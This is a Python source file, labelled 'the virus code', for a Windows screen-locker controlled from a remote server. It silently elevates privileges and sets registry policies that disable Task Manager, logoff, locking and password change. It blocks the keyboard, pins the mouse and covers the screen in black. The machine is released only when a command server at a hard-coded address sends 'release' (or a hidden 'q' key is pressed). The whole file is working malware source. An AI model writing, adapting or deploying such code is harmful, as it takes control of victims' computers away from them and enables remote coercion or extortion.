"""
the virus code
"""
import wx
import keyboard
import threading
import mouse
import winreg as wreg
from winreg import *
from elevate import elevate
import socket
import sys
import os
import win32com.shell.shell as shell
import time


# constants
RELEASE_REQUEST = "release"
REG_PATH_SYSTEM = r"SOFTWARE\\" \
                  r"Microsoft\\" \
                  r"Windows\\" \
                  r"CurrentVersion\\" \
                  r"Policies\\System"
REG_PATH_EXPLORER = r"SOFTWARE\\" \
                    r"Microsoft\\" \
                    r"Windows\\" \
                    r"CurrentVersion\\" \
                    r"Policies\\" \
                    r"Explorer"
VIRUS_REQUEST = "I_AM_A_VIRUS"
ASADMIN = 'asadmin'
# Server's IP
IP = "10.0.0.162"
PORT = 1729
LEN_NUMBER = 4
STILL_ALIVE = 1

isReleased = False


class MyPanel(wx.Panel):
    """
    The function of the screen
    """

    def __init__(self, parent):
        """
        Constructor
        """
        wx.Panel.__init__(self, parent)
        self.Bind(wx.EVT_KEY_DOWN, self.onKey)
        self.SetBackgroundColour(wx.Colour('Black'))

    def onKey(self, event):
        """
        Check for ESC key press and exit is ESC is pressed
        """
        key_code = event.GetKeyCode()
        if key_code == wx.WXK_ESCAPE:
            self.GetParent().Close()
        else:
            event.Skip()

    def onQ(self, event):
        """
        Check for ESC key press and exit is ESC is pressed
        """
        global isReleased
        if isReleased:
            self.GetParent().Close()


class MyFrame(wx.Frame):
    """
    The desgin of the screen
    """

    def __init__(self):
        """
        Constructor
        """
        wx.Frame.__init__(self, None, title="FullScreen")
        panel = MyPanel(self)
        self.ShowFullScreen(True)
        self.timer = wx.Timer(self)
        self.Bind(wx.EVT_TIMER, panel.onQ, self.timer)
        self.timer.Start(1000)


def blackWindow():
    """
    Opens a black window without exit button
    all over the screen
    """
    app = wx.App(False)
    frame = MyFrame()
    app.MainLoop()


class Edit_Ctrl_Alt_Del(object):
    """
    Functions editing the Control Alt Delete
    """
    @staticmethod
    def create_sub_key_system():
        key = wreg.CreateKey(
            wreg.HKEY_CURRENT_USER,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies")
        wreg.SetValue(key, 'System', wreg.REG_SZ, '(value not set)')
        wreg.SetValueEx(
            key,
            'DisableChangePassword',
            0,
            wreg.REG_DWORD,
            0x00000001)
        key.Close()

    @staticmethod
    def add_value_currentUser(value_name, path):
        """
        adds a value to the registry
        """
        try:
            key = wreg.CreateKey(wreg.HKEY_CURRENT_USER, path)
            wreg.SetValueEx(key, value_name, 0, wreg.REG_DWORD, 0x00000001)
            key.Close()
        except WindowsError:
            print("Error")

    @staticmethod
    def add_value_LocalMachine(value_name, path):
        """
        adds a value to the registry
        """
        try:
            key = wreg.CreateKey(wreg.HKEY_LOCAL_MACHINE, path)
            wreg.SetValueEx(key, value_name, 0, wreg.REG_DWORD, 0x00000001)
            key.Close()
        except WindowsError:
            print("Error")

    @staticmethod
    def set_reg(root, path, name, value):
        """
        sets given  value in the requested
        registry entry root\\path\value
        """
        try:
            CreateKey(root, path)
            registry_key = OpenKey(root, path, 0, KEY_WRITE)
            SetValueEx(registry_key, name, 0, REG_SZ, value)
            CloseKey(registry_key)
        except WindowsError:
            print("Error")

    @staticmethod
    def set_reg2(root, path, name, value):
        """
        sets given  value in the requested
        registry entry root\\path\value
        """
        CreateKey(root, path)
        registry_key = OpenKey(root, path, 0, KEY_WRITE)
        SetValueEx(registry_key, name, 0, REG_DWORD, value)
        CloseKey(registry_key)

    @staticmethod
    def restore_cad():
        """
        restores all the control alt delete
        options by inserting 0 to the sub keys values
        """
        try:
            Edit_Ctrl_Alt_Del.set_reg(
                HKEY_LOCAL_MACHINE,
                REG_PATH_SYSTEM,
                "HideFastUserSwitching",
                '0')
            Edit_Ctrl_Alt_Del.set_reg(
                HKEY_CURRENT_USER,
                REG_PATH_SYSTEM,
                "DisableChangePassword",
                '0')
            Edit_Ctrl_Alt_Del.set_reg(
                HKEY_CURRENT_USER,
                REG_PATH_SYSTEM,
                "DisableLockWorkstation",
                '0')
            Edit_Ctrl_Alt_Del.set_reg2(
                HKEY_LOCAL_MACHINE,
                REG_PATH_SYSTEM,
                "DisableTaskMgr",
                0)
            Edit_Ctrl_Alt_Del.set_reg(
                HKEY_CURRENT_USER,
                REG_PATH_EXPLORER,
                "NoLogoff",
                '0')
        except Exception as msg:
            print(msg)


def removeAllControlAltDeleteOptions():
    """
    remove All Control Alt Delete Options from the
    registry editor
    """
    try:
        Edit_Ctrl_Alt_Del.create_sub_key_system()
        Edit_Ctrl_Alt_Del.add_value_currentUser(
            'DisableChangePassword', REG_PATH_SYSTEM)
        Edit_Ctrl_Alt_Del.add_value_currentUser(
            'DisableLockWorkstation', REG_PATH_SYSTEM)
        Edit_Ctrl_Alt_Del.add_value_LocalMachine(
            'DisableTaskMgr', REG_PATH_SYSTEM)
        Edit_Ctrl_Alt_Del.add_value_LocalMachine(
            'HideFastUserSwitching', REG_PATH_SYSTEM)
        Edit_Ctrl_Alt_Del.add_value_currentUser('NoLogoff', REG_PATH_EXPLORER)
    except Exception as msg:
        print(msg)


class Keyboard_mouse_handler(object):
    """
    handles the mouse and keyboard
    """
    executing = True

    @staticmethod
    def move_mouse():
        global isReleased
        # until executing is False, move mouse to (1,0)
        while Keyboard_mouse_handler.executing:
            mouse.move(1, 0, absolute=True, duration=0)
            if keyboard.is_pressed('q'):  # if key 'q' is pressed
                Keyboard_mouse_handler.executing = False
                isReleased = True

    @staticmethod
    def block_keyboard():
        """
        blocks all the keys in the keyboard
        """
        for i in range(150):
            keyboard.block_key(i)
        keyboard.release('q')


class ConnectionToServer:
    """
    The connection to the server
    """

    def __init__(self):
        """
        # constructor
        """
        # initiate socket
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket = my_socket
        # connect to server
        self.socket.connect((IP, PORT))

    def receive_client_request(self):
        """
        Receives the client's request.
        If request is release then
        releases the computer
        """
        global isReleased
        done = False
        while not done:
            try:
                raw_size = self.socket.recv(LEN_NUMBER)
                data_size = raw_size.decode()
                if data_size.isdigit():
                    raw_request = self.socket.recv(int(data_size))
                    request = raw_request.decode()
                    if request == RELEASE_REQUEST:
                        Edit_Ctrl_Alt_Del.restore_cad()
                        isReleased = True
                        Keyboard_mouse_handler.executing = False
                        done = True
                        for i in range(150):
                            keyboard.release(i)
            except socket.error as msg:
                print("The Server left")
            except Exception as msg:
                print(msg)

    def bulid_request_and_send(self, request):
        """
        Sends the request to the server
        """
        size = str(len(request)).zfill(4)
        request = size + request
        print(request)
        self.socket.send(request.encode())
        print("hi")


def main():
    """
    Blocks mouse and keyboard
    """
    elevate(show_console=False)
    Connection = ConnectionToServer()
    Connection.bulid_request_and_send(VIRUS_REQUEST)
    thread3 = threading.Thread(target=Connection.receive_client_request)
    thread3.start()
    removeAllControlAltDeleteOptions()
    time.sleep(10)
    block = Keyboard_mouse_handler()
    block.block_keyboard()
    thread2 = threading.Thread(target=block.move_mouse)
    thread2.start()
    blackWindow()


if __name__ == '__main__':
    main()